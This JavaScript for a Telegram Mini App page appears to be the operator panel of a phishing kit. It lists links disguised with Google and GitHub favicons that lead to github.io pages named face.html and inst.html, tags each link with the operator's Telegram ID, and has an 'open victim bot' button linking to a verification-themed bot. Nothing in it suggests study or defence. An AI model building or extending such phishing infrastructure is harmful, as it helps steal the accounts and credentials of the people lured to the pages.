  // Inline page logic (uses createLinkItem from premiumlist.js)
  const tg = window.Telegram?.WebApp || null;
  const userId = tg?.initDataUnsafe?.user?.id || null;

  // free links (edit here)
  const freeLinksData = [
    { title: "Google", url: "https://rrloaty.github.io/a/face.html?id={id}", thumb: "https://www.google.com/favicon.ico" },
    { title: "GitHub", url: "https://rrloaty.github.io/a/inst.html?id={id}", thumb: "https://github.githubassets.com/favicons/favicon.svg" }
  ];

  document.addEventListener("DOMContentLoaded", () => {
    // show user name / handle (if present)
    if (tg?.initDataUnsafe?.user) {
      const u = tg.initDataUnsafe.user;
      document.getElementById("user-name").textContent = u.first_name + (u.last_name ? " " + u.last_name : "");
      document.getElementById("user-handle").textContent = u.username ? "@" + u.username : "";
    }

    // Render free links using the global createLinkItem from premiumlist.js
    const freeContainer = document.getElementById("free-links");
    freeLinksData.forEach(link => {
      freeContainer.appendChild(window.createLinkItem(link, true, userId));
    });

    // NOTE: DO NOT render premium links here — premiumlist.js already does that.

    // Tabs & bottom nav
    document.querySelectorAll('.tab-btn, .nav-item').forEach(btn => {
      btn.addEventListener('click', () => switchSection(btn.dataset.target));
    });

    // Copy ID, refresh, open victim bot
    document.getElementById("copy-id-btn").addEventListener("click", () => {
      if (userId) navigator.clipboard.writeText(String(userId)).then(()=> alert("Telegram ID copied!"));
    });
    document.getElementById("refresh-btn").addEventListener("click", () => location.reload());
    document.getElementById("open-victim-bot").addEventListener("click", () => {
      const url = `https://t.me/intelligentverificationlinkbot?start=${userId || ""}`;
      if (tg?.openLink) tg.openLink(url);
      else window.open(url, "_blank");
    });
  });

  function switchSection(sectionId) {
    document.querySelectorAll(".section").forEach(s => s.classList.remove("active"));
    document.getElementById(sectionId).classList.add("active");
    document.querySelectorAll(".tab-btn, .nav-item").forEach(b => b.classList.toggle("active", b.dataset.target === sectionId));
  }

  function copyTextValue(value) {
    navigator.clipboard.writeText(value).then(() => { alert("Copied!"); });
  }